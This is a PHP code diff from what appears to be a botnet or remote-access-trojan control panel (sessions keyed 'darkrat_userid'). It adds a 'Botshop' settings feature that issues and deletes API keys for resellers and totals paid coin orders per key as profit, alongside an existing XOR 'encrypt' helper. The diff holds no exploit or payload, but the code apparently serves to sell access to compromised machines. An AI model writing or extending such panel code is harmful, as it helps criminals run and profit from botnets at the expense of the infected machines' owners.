@@ -352,6 +352,19 @@ class Main{
           //  die();
 
 
+            //Botshop
+            //case when kind = 1 then 1 else 0 end
+            // sum(IFNULL( case when botshop_orders.payed = 1 then botshop_orders.coinstopay else 0 end, 0))
+            $statementConfig = $GLOBALS["pdo"]->prepare("SELECT SUM(CASE When botshop_orders.payed=1 Then botshop_orders.coinstopay Else 0 End ) as profit, botshop_access.apikey, botshop_access.id, users.username 
+                                                         FROM botshop_access 
+                                                         LEFT JOIN users ON users.id = botshop_access.created_by_userid 
+                                                         LEFT JOIN botshop_orders ON botshop_orders.from_access_api = botshop_access.apikey
+                                                          WHERE botshop_access.active = ? group by botshop_access.apikey");
+            $statementConfig->execute(array(1));
+            $botshopAccessList = $statementConfig->fetchAll();
+
+
+
            if(!empty($_POST)){
                 if(!empty($_POST["changeTemplate"])){
                     $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET template = ? WHERE id = ?");
@@ -392,6 +405,16 @@ class Main{
                     }
                 }
 
+                if(!empty($_POST["create_new_shop_api"])){
+                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_access (created_by_userid, apikey) VALUES (:userid, :apikey)");
+                    $statement->execute(array('userid' => $_SESSION["darkrat_userid"], 'apikey' => $this->random_string()));
+                }
+
+                if(!empty($_POST["deleteapi"])){
+                    $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM botshop_access WHERE id = ?");
+                    $statement->execute(array($_POST["deleteapi"]));
+                }
+
                 if(!empty($_POST["encrypt"])){
                     $handler = new BotHandler();
                     $encryptedOUT =$handler->xor_this($_POST["encrypt"]);
@@ -399,10 +422,14 @@ class Main{
                     Header("Location: /settings");
                 }
            }
+
+
+
             $GLOBALS["tpl"]->assign("users", $users);
             $GLOBALS["tpl"]->assign("config", $config);
             $GLOBALS["tpl"]->assign("templates", $templates);
             $GLOBALS["tpl"]->assign("encryptedOUT", $encryptedOUT);
+            $GLOBALS["tpl"]->assign("botshopAccessList", $botshopAccessList);
         }
 
         function formatBytes($size, $precision = 2) {
